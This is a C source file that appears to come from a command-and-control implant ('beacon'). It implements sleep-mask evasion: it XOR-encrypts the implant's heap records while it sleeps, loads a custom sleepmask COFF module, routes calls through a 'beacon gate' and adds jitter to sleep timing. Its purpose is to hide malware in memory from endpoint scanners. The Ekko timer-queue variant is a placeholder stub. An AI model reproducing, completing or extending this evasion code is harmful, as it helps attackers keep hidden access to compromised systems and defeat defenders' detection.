#include "config.h"
#include "common.h"
#include "crypto.h"
#include "evasion/sleepmask.h"
#include "evasion/beacon_gate_impl.h"

VOID sleep_mask_none(PINSTANCE inst, DWORD ms) {
    inst->Win32.Sleep(ms);
}

VOID sleep_mask_default(PINSTANCE inst, DWORD ms) {
    // XOR heap records during sleep
    BEACON_INFO* bi = &inst->BeaconInfo;
    if (bi->heap_records) {
        HEAP_RECORD* hr = bi->heap_records;
        while (hr->ptr) {
            xor_bytes((BYTE*)hr->ptr, hr->size, (const BYTE*)bi->mask, MASK_SIZE);
            hr++;
        }
    }

    inst->Win32.Sleep(ms);

    // Unmask
    if (bi->heap_records) {
        HEAP_RECORD* hr = bi->heap_records;
        while (hr->ptr) {
            xor_bytes((BYTE*)hr->ptr, hr->size, (const BYTE*)bi->mask, MASK_SIZE);
            hr++;
        }
    }
}

VOID sleep_mask_ekko(PINSTANCE inst, DWORD ms) {
    // Ekko timer-queue sleep with ROP chain
    // Full implementation requires RtlCaptureContext, NtContinue, timer queues
    // Placeholder: falls back to default mask for now
    sleep_mask_default(inst, ms);
}

VOID populate_beacon_info(PINSTANCE inst) {
    BEACON_INFO* bi = &inst->BeaconInfo;
    ALLOCATED_MEMORY savedAm;
    es_memcpy(&savedAm, &bi->allocatedMemory, sizeof(ALLOCATED_MEMORY));
    es_memset(bi, 0, sizeof(BEACON_INFO));
    es_memcpy(&bi->allocatedMemory, &savedAm, sizeof(ALLOCATED_MEMORY));
    bi->version = ES_VERSION;

    if (inst->pfnSleepMask) {
        bi->sleep_mask_ptr = (char*)inst->pfnSleepMask;
        bi->sleep_mask_text_size = inst->dwSleepMaskTextSize;
        bi->sleep_mask_total_size = inst->dwSleepMaskTextSize;
    }

    bi->beacon_ptr = (char*)inst->Base.Buffer;

    LARGE_INTEGER counter;
    counter.QuadPart = __rdtsc();
    DWORD seed = counter.LowPart;
    for (int i = 0; i < MASK_SIZE; i++) {
        seed = seed * 1103515245 + 12345;
        bi->mask[i] = (char)(seed >> 16);
    }
}

#if SLEEP_MASK_TYPE == MASK_UDRL

static VOID sleep_mask_udrl(PINSTANCE inst, DWORD ms) {
    // Load sleepmask COFF on first call
    if (!inst->bSleepMaskLoaded) {
#ifdef SLEEPMASK_COFF_SIZE
        if (SLEEPMASK_COFF_SIZE > 0) {
            BOOL ok = sleepmask_load_coff(inst,
                (BYTE*)SLEEPMASK_COFF, SLEEPMASK_COFF_SIZE, "sleep_mask");
            if (!ok) {
                sleep_mask_none(inst, ms);
                return;
            }
        } else {
            sleep_mask_none(inst, ms);
            return;
        }
#else
        sleep_mask_none(inst, ms);
        return;
#endif
    }

    if (!inst->pfnSleepMask) {
        sleep_mask_none(inst, ms);
        return;
    }

    populate_beacon_info(inst);

    FUNCTION_CALL fc;
    es_memset(&fc, 0, sizeof(FUNCTION_CALL));
    fc.functionPtr = (PVOID)inst->Win32.Sleep;
    fc.function = SLEEP;
    fc.numOfArgs = 1;
    fc.args[0] = (ULONG_PTR)ms;
    fc.bMask = TRUE;

    void* saved_teb = coff_read_teb_user_ptr();
    coff_set_inst_for_mask(inst);

    typedef void (*SLEEPMASK_FN)(PBEACON_INFO, PFUNCTION_CALL);
    SLEEPMASK_FN fn = (SLEEPMASK_FN)inst->pfnSleepMask;
    fn(&inst->BeaconInfo, &fc);

    coff_restore_teb_user_ptr(saved_teb);
}

#endif // SLEEP_MASK_TYPE == MASK_UDRL

VOID do_sleep(PINSTANCE inst, DWORD ms) {
    if (inst->Config.jitter > 0 && ms > 0) {
        LARGE_INTEGER counter;
        counter.QuadPart = __rdtsc();
        DWORD jitter_range = (ms * inst->Config.jitter) / 100;
        if (jitter_range > 0) {
            DWORD offset = counter.LowPart % jitter_range;
            ms = ms - jitter_range / 2 + offset;
        }
    }

    if (inst->bBeaconGateEnabled && inst->pfnSleepMask && inst->bSleepMaskLoaded) {
        FUNCTION_CALL fc;
        es_memset(&fc, 0, sizeof(FUNCTION_CALL));
        fc.functionPtr = (PVOID)inst->Win32.Sleep;
        fc.function    = SLEEP;
        fc.numOfArgs   = 1;
        fc.args[0]     = (ULONG_PTR)ms;
        fc.bMask       = TRUE;
        beacon_gate_dispatch(inst, &fc);
        return;
    }

#if SLEEP_MASK_TYPE == MASK_NONE
    sleep_mask_none(inst, ms);
#elif SLEEP_MASK_TYPE == MASK_EKKO
    sleep_mask_ekko(inst, ms);
#elif SLEEP_MASK_TYPE == MASK_UDRL
    sleep_mask_udrl(inst, ms);
#else
    sleep_mask_default(inst, ms);
#endif
}
